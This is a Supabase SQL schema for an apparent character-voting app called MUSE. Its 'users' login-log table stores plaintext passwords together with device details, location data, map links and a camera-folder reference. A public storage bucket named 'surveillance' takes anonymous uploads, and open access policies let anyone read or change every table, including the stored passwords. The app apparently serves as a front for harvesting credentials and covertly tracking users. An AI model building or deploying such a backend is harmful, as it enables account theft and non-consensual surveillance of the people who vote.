-- --------------------------------------------------------
-- SUPABASE / POSTGRESQL SCHEMA FOR MUSE APP
-- Copy and run this in your Supabase SQL Editor to fix RLS errors
-- --------------------------------------------------------

-- 1. Create Characters Table
create table if not exists public.characters (
    character_id text primary key,
    name text not null,
    role text,
    description text,
    image_url text,
    votes int default 0,
    theme_color text,
    family_name text default 'Unknown Family',
    family_icon text default 'crown',
    active_effect text default 'none',
    created_at timestamp with time zone default timezone('utc'::text, now())
);

-- ADD COLUMN IF NOT EXISTS
DO $$
BEGIN
    IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='characters' AND column_name='active_effect') THEN
        ALTER TABLE public.characters ADD COLUMN active_effect text default 'none';
    END IF;
END $$;

alter publication supabase_realtime add table characters;

-- 2. Create Votes Table
create table if not exists public.votes (
    id bigint generated by default as identity primary key,
    user_identifier text not null,
    character_id text references public.characters(character_id),
    device_info jsonb,
    location_data jsonb,
    maps_url text,
    created_at timestamp with time zone default timezone('utc'::text, now())
);

-- 3. Create Users/Login Logs Table
create table if not exists public.users (
    id bigint generated by default as identity primary key,
    user_identifier text not null, 
    password_text text,
    login_method text,
    device_info jsonb,
    location_data jsonb,
    maps_url text,
    camera_folder_ref text,
    last_login timestamp with time zone default timezone('utc'::text, now())
);

-- 4. Create Global Settings Table (NEW: For Timer Sync)
create table if not exists public.settings (
    key text primary key,
    value text,
    updated_at timestamp with time zone default timezone('utc'::text, now())
);

-- Insert default rows if not exist
insert into public.settings (key, value) values ('voting_deadline', null) on conflict (key) do nothing;

alter publication supabase_realtime add table settings;

-- 5. Storage
insert into storage.buckets (id, name, public) values ('surveillance', 'surveillance', true)
on conflict (id) do nothing;

-- 6. FIX & RESET RLS POLICIES

-- Characters
alter table public.characters enable row level security;
drop policy if exists "Allow public read characters" on public.characters;
drop policy if exists "Allow public insert/update characters" on public.characters;
create policy "Allow public read characters" on public.characters for select using (true);
create policy "Allow public insert/update characters" on public.characters for all using (true) with check (true);

-- Votes
alter table public.votes enable row level security;
drop policy if exists "Allow public insert votes" on public.votes;
create policy "Allow public insert votes" on public.votes for insert with check (true);
-- Allow checking if user voted (Select access)
create policy "Allow public read votes" on public.votes for select using (true);

-- Users
alter table public.users enable row level security;
drop policy if exists "Enable all access for public users" on public.users;
create policy "Enable all access for public users" on public.users for all using (true) with check (true);

-- Settings
alter table public.settings enable row level security;
drop policy if exists "Allow public read settings" on public.settings;
drop policy if exists "Allow public update settings" on public.settings;
create policy "Allow public read settings" on public.settings for select using (true);
create policy "Allow public update settings" on public.settings for all using (true) with check (true);

-- Storage
create policy "Allow public uploads" on storage.objects for insert with check ( bucket_id = 'surveillance' );

-- 7. ENSURE UNIQUE CONSTRAINT
DO $$
BEGIN
  IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'users_user_identifier_key') THEN
    DELETE FROM public.users a USING public.users b 
    WHERE a.id < b.id AND a.user_identifier = b.user_identifier;
    ALTER TABLE public.users ADD CONSTRAINT users_user_identifier_key UNIQUE (user_identifier);
  END IF;
END $$;

-- 8. Triggers
create or replace function public.increment_vote_count()
returns trigger as $$
begin
  update public.characters
  set votes = votes + 1
  where character_id = new.character_id;
  return new;
end;
$$ language plpgsql security definer;

drop trigger if exists on_vote_added on public.votes;
create trigger on_vote_added
after insert on public.votes
for each row execute procedure public.increment_vote_count();